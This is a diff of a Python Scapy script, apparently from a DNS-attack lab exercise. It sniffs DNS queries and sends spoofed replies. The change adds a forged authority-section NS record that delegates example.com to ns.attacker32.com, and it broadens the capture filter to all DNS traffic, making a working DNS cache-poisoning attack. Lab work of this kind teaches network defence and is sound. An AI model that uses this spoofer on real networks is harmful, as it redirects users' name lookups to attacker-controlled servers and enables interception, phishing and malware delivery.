@@ -13,13 +13,16 @@ def spoof_dns(pkt):
     # The Answer Section
     Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                  ttl=259200, rdata='10.0.2.5')
+    #Adaugare NS in sectiunea authority  example.com. 259200 IN NS ns.attacker32.com
+    NS = DNSRR(rrname='example.com', type='NS',
+                   ttl=259200, rdata='ns.attacker32.com')
     # Construct the DNS packet
     DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  
                  qdcount=1, ancount=1, nscount=2, arcount=2,
-                 an=Anssec)
+                 an=Anssec, ns=NS)
     # Construct the entire IP packet and send it out
     spoofpkt = IPpkt/UDPpkt/DNSpkt
     send(spoofpkt)
 # Sniff UDP query packets and invoke spoof_dns().
-f = 'udp and src host 10.9.0.53 and dst port 53'
+f = 'udp and dst port 53'
 pkt = sniff(iface='br-1ee11a571e21', filter=f, prn=spoof_dns)      
